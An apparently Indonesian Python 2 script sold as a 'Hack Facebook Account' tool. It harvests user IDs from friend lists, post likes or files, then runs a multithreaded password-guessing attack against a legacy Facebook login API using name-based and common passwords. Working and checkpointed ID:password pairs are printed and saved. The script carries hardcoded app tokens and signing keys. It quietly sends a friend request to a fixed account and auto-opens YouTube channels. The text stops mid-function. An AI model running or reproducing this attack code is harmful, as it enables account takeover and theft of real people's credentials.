#!/usr/bin/python2
# coding=utf-8

#Import module
import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
from datetime import datetime
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import bs4
except ImportError:
	os.system("pip2 install bs4")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 wic.py")
from requests.exceptions import ConnectionError
from mechanize import Browser 

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0b11pre) Gecko/20110126 Firefox/4.0b11pre')]

os.system("clear")
done = False
def animate():
    for c in itertools.cycle(['\033[1;96m|', '\033[1;92m/', '\033[1;95m-', '\033[1;91m\\']):
        if done:
            break
        sys.stdout.write('\rloading ' + c)
        sys.stdout.flush()
        time.sleep(0.1)

t = threading.Thread(target=animate)
t.start()
 
t = threading.Thread(target=animate)
t.start()
 
time.sleep(0.5)
done = True


def keluar():
	print "[!] Exit"
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.1)
		
#########LOGO#########
logo = """
\033[0;97m 
Hallo.. Welcome:) 
\n░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
\033[0;91m███\033[0;97m╗░░░\033[0;91m███\033[0;97m╗\033[0;91m██████\033[0;97m╗░\033[0;91m███████\033[0;97m╗░░░░░░░░░░░░░░░░░░░░░░░░░░
\033[0;91m████\033[0;97m╗░\033[0;91m████\033[0;97m║\033[0;91m██\033[0;97m╔══\033[0;91m██\033[0;97m╗\033[0;91m██\033[0;97m╔════╝[×] Facebook : Aziz Nation
\033[0;91m██\033[0;97m╔\033[0;91m████\033[0;97m╔\033[0;91m██\033[0;97m║\033[0;91m██████\033[0;97m╦╝\033[0;91m█████\033[0;97m╗░░[×] Git : Github.com/4ZIZ14
██║╚██╔╝██║██╔══██╗██╔══╝░░░░░░░░░░░░░░░░░░░░░░░░░░░░
██║░╚═╝░██║██████╦╝██║░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
╚═╝░░░░░╚═╝╚═════╝░╚═╝░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;97m[\033[0;93m●\033[0;97m]\033[0;93m Sedang Masuk\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
cpe = []
id = []
username = []
idteman = []
idfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'


######MASUK######
def masuk():
	os.system('clear')
	print logo
	print "\033[0;97m ╔                                     ╗"
	print "\033[0;97m  [\033[0;97m01\033[0;97m]\033[0;96m\033[1;93m Login Menggunakan Token\033[1;97m{\033[1;92mAnti CP\033[1;97m}"
	print "\033[0;97m  [\033[0;97m03\033[0;97m]\033[0;96m\033[1;93m Login Manual\033[1;97m{\033[1;91mRawan CP\033[1;97m}"
	print "\033[0;97m  [\033[0;97m02\033[0;97m]\033[0;96m\033[1;93m Cara Ambil Token\033[1;97m{\033[1;92mAnti CP\033[1;97m}"
	print "\033[0;97m  [\033[0;91m00\033[0;97m]\033[0;96m\033[1;91m Keluar"
	print "\033[0;97m ╚                                     ╝"
	pilih_masuk()

def pilih_masuk():
	msuk = raw_input("\033[0;97m [\033[0;91m•\033[0;97m•\033[0;97m]\033[0;97m ")
	if msuk =="":
		print"\033[0;97m[\033[0;91m!\033[0;97m] Isi Yg Benar Bro !"
		pilih_masuk()
	elif msuk =="1" or msuk =="01":
		tokenz()
	elif msuk =="2"or msuk =="02":
		manual()
	elif msuk =="3"or msuk =="03":
		ambil_token()
	elif msuk =="0" or msuk =="00":
		keluar()
	else:
		print"\033[0;97m[\033[0;91m!\033[0;97m] Isi Yg Benar Bro !"
		pilih_masuk()
		
#####LOGIN_TOKENZ#####
def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[0;97m[\033[0;39m?\033[1;93m] \33[0;39mToken : \33[0;93m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		print '\033[0;97m[\033[0;39m✓\033[0;97m]\033[1;92m Login Berhasil'
		jalan ('\033[1;97mJANGAN LUPA SUBSCRIBE YA :)')
		os.system('xdg-open https://youtube.com/channel/UCzL-chxGyjMhrkRPU8dGfMQ')
		menu()
	except KeyError:
		print "\033[0;97m[\033[0;39m!\033[0;97m] \033[1;92mToken Salah !"
		time.sleep(0.01)
		masuk()
		


######AMBIL_TOKEN######
def ambil_token():
	os.system ("clear")
	print logo
	print 50* "\033[1;94m─"
	jalan("        \033[1;92mAnda Akan Di Arahkan Ke Youtube ...")
	os.system('xdg-open https://youtu.be/ViEtoEF7Uiw')
	time.sleep(2)
	masuk()
	
	######AMBIL_TOKEN######


def manual():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print('\033[1;96m      [] \x1b[1;91m───Login Akun Baru───\x1b[1;93m[⚡]' )
		id = raw_input('\033[1;93m[+] \x1b[0;34mID/Email \x1b[1;95m: \x1b[1;95m')
		pwd = raw_input('\033[1;95m[+] \x1b[0;34mPassword \x1b[1;93m: \x1b[1;93m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\033[1;96m[✓] \x1b[1;92mLogin Hogai'
				os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;96m[!] \x1b[1;91mAkun Sepertina Terkena checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email Salah Bro")
			os.system('rm -rf login.txt')
			time.sleep(1)
			masuk()
			
			
######BOT KOMEN#######
def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[0;39m[!] Token invalid"
		os.system('rm -rf login.txt')
	una = ('')
	kom = ('')
	reac = ('')
	post = ('')
	post2 = ('')
	kom2 = ('')
	reac2 = ('')
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
	menu()

######MENU#######
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token=' +toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[0;96m[!] \033[0;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		masuk()
	except requests.exceptions.ConnectionError:
		print"[!] Tidak ada koneksi"
		keluar()
	os.system("clear")
	print logo
	print 53*"\033[1;97m═"
	print "\033[0;97m [\033[0;91m×\033[0;97m]\033[0;97m Nama Akun\033[0;97m     ·\033[0;97m "+nama
	print "\033[0;97m [\033[0;91m×\033[0;97m]\033[0;97m User ID\033[0;97m       ·\033[0;97m "+id
	print "\033[0;97m [\033[0;91m×\033[0;97m]\033[0;97m Tanggal Lahir\033[0;97m ·\033[0;97m "+ a['birthday']
	print "\033[0;97m ╔═════════════════════════════════════════╗"
	print "\033[0;97m [\033[0;97m01\033[0;97m]\033[0;97m\033[0;97m Hack Facebook Account ( indo )"
	print "\033[0;97m [\033[0;97m02\033[0;97m]\033[0;97m\033[0;97m Hack Facebook Account ( bangla )"
	print "\033[0;97m [\033[0;91m00\033[0;97m]\033[0;97m\033[0;97m Logout"
	print "\033[0;97m ╚═════════════════════════════════════════╝"
	pilih()
	
######PILIH######
def pilih():
	unikers = raw_input("\033[0;97m [\033[0;91m•\033[0;97m•\033[0;97m]\033[0;97m ")
	if unikers =="":
		print"\033[0;97m[\033[0;91m!\033[0;97m]\033[0;97m Isi Yg Benar !"
		pilih()
	elif unikers =="1" or unikers =="01":
		indo()
	elif unikers =="2" or unikers =="02":
		bangla()
	elif unikers =="0" or unikers =="00":
		os.system('clear')
		jalan('Menghapus Token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print"\033[0;97m[\033[0;91m!\033[0;97m]\033[0;97m Isi Yg Benar !"
		pilih()
	
########## CRACK INDONESIA #######
def indo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[0;96m[!] \x1b[0;91mToken Invalid"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		keluar()
	os.system('clear')
	print logo
	print 53*"\033[1;97m═"
	print "\033[0;97m [\033[0;97m01\033[0;97m]\033[0;97m\033[0;97m Crack dari ID Publik / Teman"
	print "\033[0;97m [\033[0;97m02\033[0;97m]\033[0;97m\033[0;97m Crack dari File"
	print "\033[0;97m [\033[0;91m00\033[0;97m]\033[0;97m\033[0;97m Kembali"
	print 53*"\033[1;97m═"
	pilih_indo()

#### PILIH INDO ####
def pilih_indo():
	teak = raw_input("\033[0;97m [\033[0;91m•\033[0;97m•\033[0;97m]\033[0;97m ")
	if teak =="":
		print"\033[0;97m[\033[0;91m!\033[0;97m]\033[0;97m Isi Yg Benar Bro!"
		pilih_indo()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print logo
		print 53*"\033[1;97m═"
		idt = raw_input("\033[0;97m [\033[0;91m•\033[0;97m•\033[0;97m] User ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[0;97m [\033[0;91m•\033[0;97m•\033[0;97m] Nama Akun      : "+op["name"]
		except KeyError:
			print"\033[0;97m[\033[0;93m!\033[0;97m] ID Publik / Teman Tidak Ada !"
			raw_input("\n[ Kembali ]")
			indo()
		except requests.exceptions.ConnectionError:
			print"[!] Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print logo
		try:
			print "\033[0;97m ══════════════════════════════════════════"
			idlist = raw_input('\033[0;97m [\033[0;91m•\033[0;97m•\033[0;97m] Nama File Target : ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[0;97m[\033[0;93m!\033[0;97m] File tidak ada ! '
			raw_input('\n\033[0;92m[ \033[0;97mKembali \033[0;92m]')
		except IOError:
			print '\033[0;97m[!] File tidak ada !'
			raw_input('\n\033[0;92m[ \033[0;97mKembali \033[0;92m]')
			indo()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[0;97m[\033[0;91m!\033[0;97m]\033[0;97m Isi Yg Benar !"
		pilih_indo()
	
	print "\033[0;97m [\033[0;91m•\033[0;97m•\033[0;97m] Total ID       : "+str(len(id))
	print 53*"\033[1;97m═"
	print "\033[0;97m \033[0;40;97m     CTRL+Z UNTUK BERHENTI , HAPPY CRACKING :("
	print 53*"\033[1;97m═"
##### MAIN INDONESIA #####
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			c = json.loads(a.text)
			pass1 = c['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			w = json.load(data)
			if 'access_token' in w:
				print '\033[0;92m[OK] ' + user + ' • ' + pass1 + ' • ' + c['birthday']
				oks.append(user)
			else:
				if 'www.facebook.com' in w['error_msg']:
					print '\033[0;93m[CP] ' + user + ' • ' + pass1 + ' • ' + c['birthday']
					cekpoint.append(user)
				else:
					pass2 = c['first_name'].lower()+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					w = json.load(data)
					if 'access_token' in w:
						print '\033[0;92m[OK] ' + user + ' • ' + pass2 + ' • ' + c['birthday']
						oks.append(user)
					else:
						if 'www.facebook.com' in w['error_msg']:
							print '\033[0;93m[CP] ' + user + ' • ' + pass2 + ' • ' + c['birthday']
							cekpoint.append(user)
						else:
							pass3 = c['first_name'].lower()+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							w = json.load(data)
							if 'access_token' in w:
								print '\033[0;92m[OK] ' + user + ' • ' + pass3 + ' • ' + c['birthday']
								oks.append(user)
							else:
								if 'www.facebook.com' in w['error_msg']:
									print '\033[0;93m[CP] ' + user + ' • ' + pass3 + ' • ' + c['birthday']
									cekpoint.append(user)
								else:
									pass4 = 'sayang'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									w = json.load(data)
									if 'access_token' in w:
										print '\033[0;92m[OK] ' + user + ' • ' + pass4 + ' • ' + c['birthday']
										oks.append(user)
									else:
										if 'www.facebook.com' in w['error_msg']:
											print '\033[0;93m[CP] ' + user + ' • ' + pass4 + ' • ' + c['birthday']
											cekpoint.append(user)
										else:
											pass5 = 'bangsat'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											w = json.load(data)
											if 'access_token' in w:
												print '\033[0;92m[OK] ' + user + ' • ' + pass5 + ' • ' + c['birthday']
												oks.append(user)
											else:
												if 'www.facebook.com' in w['error_msg']:
													print '\033[0;93m[CP] ' + user + ' • ' + pass5 + ' • ' + c['birthday']
													cekpoint.append(user)
												else:
													pass6 = 'anjing'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													w = json.load(data)
													if 'access_token' in w:
														print '\033[0;92m[OK] ' + user + ' • ' + pass6 + ' • ' + c['birthday']
														oks.append(user)
													else:
														if 'www.facebook.com' in w['error_msg']:
															print '\033[0;93m[CP] ' + user + ' • ' + pass6 + ' • ' + c['birthday']
															cekpoint.append(user)
														else:
															pass7 = 'kontol'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															w = json.load(data)
															if 'access_token' in w:
																print '\033[0;92m[OK] ' + user + ' • ' + pass7 + ' • ' + c['birthday']
																oks.append(user)
															else:
																if 'www.facebook.com' in w['error_msg']:
																	print '\033[0;93m[CP] ' + user + ' • ' + pass7 + ' • ' + c['birthday']
																	cekpoint.append(user)
																else:
																	pass8 = c['last_name'].lower()+'123'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	w = json.load(data)
																	if 'access_token' in w:
																		print '\033[0;92m[OK] ' + user + ' • ' + pass8 + ' • ' + c['birthday']
																		oks.append(user)
																	else:
																		if 'www.facebook.com' in w['error_msg']:
																			print '\033[0;93m[CP] ' + user + ' • ' + pass8 + ' • ' + c['birthday']
																			cekpoint.append(user)
																			
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print 45* "\033[0;97m="
	print '\033[0;97m[\033[0;91m•\033[0;93m•\033[0;92m•\033[0;97m] \033[0;97mSelesai ....'
	print"\033[0;97m[\033[0;91m•\033[0;93m•\033[0;92m•\033[0;97m] \033[0;97mTotal \033[0;92mOK\033[0;97m/\x1b[0;93mCP \033[0;97m: \033[0;92m"+str(len(oks))+"\033[0;97m/\033[0;93m"+str(len(cekpoint))
	print '\033[0;97m[\033[0;91m•\033[0;93m•\033[0;92m•\033[0;97m] \033[0;97mCP file tersimpan : out/ind1.txt'
	print 45* "\033[0;97m="
	raw_input("\033[0;97m[\033[0;97m Kembali \033[0;97m]")
	os.system("python2 hitfb.py")
	
##### CRACK LIKES #####
def crack_likes():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[0;97m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.system('clear')
		print logo
		print "\033[0;97m ══════════════════════════════════════════"
		tez = raw_input("\033[0;97m [\033[0;91m•\033[0;97m•\033[0;97m] ID Postingan Group / Teman : ")
		r = requests.get("https://graph.facebook.com/"+tez+"/likes?limit=5000&access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
		jalan('\r\033[0;97m [\033[0;91m•\033[0;97m•\033[0;97m] \033[0;97mSukses Mengambil ID \033[0;97m...')
	except KeyError:
		print"\033[0;97m[\033[0;93m!\033[0;97m] \033[0;97mID Postingan Salah !"
		raw_input('\n\033[0;93m[ \033[0;97mKembali \033[0;93m]')
		crack_likes()
		
	print "\033[0;97m [\033[0;91m•\033[0;97m•\033[0;97m] Total ID : "+str(len(id))
	print('\033[0;97m [\033[0;91m•\033[0;97m•\033[0;97m] Stop CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;97m[\033[0;93m•\033[0;97m] Crack Berjalan "+o),;sys.stdout.flush();time.sleep(0.01)
	print "\n\033[0;97m=========================================="
	
##### MAIN LIKES #####
	def main(arg):
		sys.stdout.write('\r{}'.format(datetime.now().strftime('\033[0;97m%H:%M:%S')));sys.stdout.flush()
		global cekpoint,oks
		zowe = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print '\033[1;92m[OK] ' + zowe + ' | ' + bos1 + ' | ' + j['name']
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print '\033[1;92m[CP] ' + zowe + ' | ' + bos1 + ' | ' + j['name']
					cek = open("done/grup.txt", "a")
					cek.write("ID:" +zowe+ " PW:" +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print '\033[1;92m[OK] ' + zowe + ' | ' + bos2 + ' | ' + j['name']
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print '\033[1;92m[CP]] ' + zowe + ' | ' + bos2 + ' | ' + j['name']
							cek = open("done/grup.txt", "a")
							cek.write("ID:" +zowe+ " PW:" +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print '\033[1;92m[OK] ' + zowe + ' | ' + bos3 + ' | ' + j['name']
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print '\033[1;92m[CP] ' + zowe + ' | ' + bos3 + ' | ' + j['name']
									cek = open("done/grup.txt", "a")
									cek.write("ID:" +zowe+ " PW:" +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = j['first_name'].lower()+'321'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print '\033[1;92m[OK] ' + zowe + ' | ' + bos4 + ' | ' + j['name']
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print '\033[1;92m[CP] ' + zowe + ' | ' + bos4 + ' | ' + j['name']
											cek = open("done/grup.txt", "a")
											cek.write("ID:" +zowe+ " PW:" +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = j['last_name'].lower()+'123'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print '\033[1;92m[OK] ' + zowe + ' | ' + bos5 + ' | ' + j['name']
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print '\033[1;92m[CP] ' + zowe + ' | ' + bos5 + ' | ' + j['name']
													cek = open("done/grup.txt", "a")
													cek.write("ID:" +zowe+ " PW:" +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = 'anjing'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print '\033[1;92m[OK] ' + zowe + ' | ' + bos6 + ' | ' + j['name']
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print '\033[1;92m[CP] ' + zowe + ' | ' + bos6 + ' | ' + j['name']
															cek = open("done/grup.txt", "a")
															cek.write("ID:" +zowe+ " PW:" +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
		except:
			pass
	p = ThreadPool(20)
	p.map(main, id)
	print 45* "\033[0;97m="
	print '\033[0;97m[\033[0;93m•\033[0;97m] \033[0;97mSelesai ....'
	print"\033[0;97m[\033[0;93m•\033[0;97m] \033[0;97mTotal \033[0;92mOK\033[0;97m/\x1b[0;93mCP \033[0;97m: \033[0;92m"+str(len(oks))+"\033[0;97m/\033[0;93m"+str(len(cekpoint))
	print '\033[0;97m[\033[0;93m•\033[0;97m] \033[0;97mCP file tersimpan : done/grup.txt'
	print 45* "\033[0;97m="
	raw_input("\033[0;97m[\033[0;97m Kembali \033[0;97m]")
	os.system("python2 hitfb.py")
	
########## CRACK INDONESIA #######
def bangla():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[0;96m[!] \x1b[0;91mToken Invalid"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		keluar()
	os.system('clear')
	print logo
	print 53*"\033[1;97m═"
	print "\033[0;97m [\033[0;97m01\033[0;97m]\033[0;97m\033[0;97m Crack dari ID Publik / Teman"
	print "\033[0;97m [\033[0;97m02\033[0;97m]\033[0;97m\033[0;97m Crack dari File"
	print "\033[0;97m [\033[0;91m00\033[0;97m]\033[0;97m\033[0;97m Kembali"
	print 53*"\033[1;97m═"
	pilih_bangla()

#### PILIH INDO ####
def pilih_bangla():
	teak = raw_input("\033[0;97m [\033[0;91m•\033[0;97m•\033[0;97m]\033[0;97m ")
	if teak =="":
		print"\033[0;97m[\033[0;91m!\033[0;97m]\033[0;97m Isi Yg Benar Bro!"
		pilih_bangla()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print logo
		print 53*"\033[1;97m═"
		idt = raw_input("\033[0;97m [\033[0;91m•\033[0;97m•\033[0;97m] User ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[0;97m [\033[0;91m•\033[0;97m•\033[0;97m] Nama Akun      : "+op["name"]
		except KeyError:
			print"\033[0;97m[\033[0;93m!\033[0;97m] ID Publik / Teman Tidak Ada !"
			raw_input("\n[ Kembali ]")
			bangla()
		except requests.exceptions.ConnectionError:
			print"[!] Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print logo
		try:
			print "\033[0;97m ══════════════════════════════════════════"
			idlist = raw_input('\033[0;97m [\033[0;91m•\033[0;97m•\033[0;97m] Nama File Target : ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[0;97m[\033[0;93m!\033[0;97m] File tidak ada ! '
			raw_input('\n\033[0;92m[ \033[0;97mKembali \033[0;92m]')
		except IOError:
			print '\033[0;97m[!] File tidak ada !'
			raw_input('\n\033[0;92m[ \033[0;97mKembali \033[0;92m]')
			bangla()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[0;97m[\033[0;91m!\033[0;97m]\033[0;97m Isi Yg Benar !"
		pilih_bangla()
	
	print "\033[0;97m [\033[0;91m•\033[0;97m•\033[0;97m] Total ID       : "+str(len(id))
	print 53*"\033[1;97m═"
	print "\033[0;97m \033[0;40;97m     CTRL+Z UNTUK BERHENTI , CRACK BANGLADESH :)"
	print 53*"\033[1;97m═"
##### MAIN INDONESIA #####
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			c = json.loads(a.text)
